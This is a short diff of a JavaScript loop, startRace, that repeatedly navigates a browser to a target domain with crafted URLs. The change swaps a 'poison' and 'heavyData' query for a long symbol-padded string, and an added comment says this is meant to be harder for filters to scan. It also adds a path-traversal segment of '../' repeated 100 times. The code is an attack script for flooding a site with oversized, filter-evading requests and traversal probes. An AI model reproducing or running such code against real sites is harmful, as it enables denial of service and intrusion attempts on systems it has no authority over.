@@ -16,7 +16,10 @@ function startRace() {
         
         // We use window.location.replace so we don't clog your "Back" button history
         // but it still counts as a full navigation event.
-        const finalUrl = `https://${domain}/?search=${poison}&payload=${heavyData}&v=${i}`;
+       // A messy string full of symbols is much harder for a filter to scan than plain letters.
+        const messyData = (Math.random().toString(36) + "!@#$%^&*()_+").repeat(200);
+        
+        const finalUrl = `https://${domain}/?id=${i}&data=${messyData}&path=${"../".repeat(100)}test`;
         
         window.location.replace(finalUrl);
         i++;
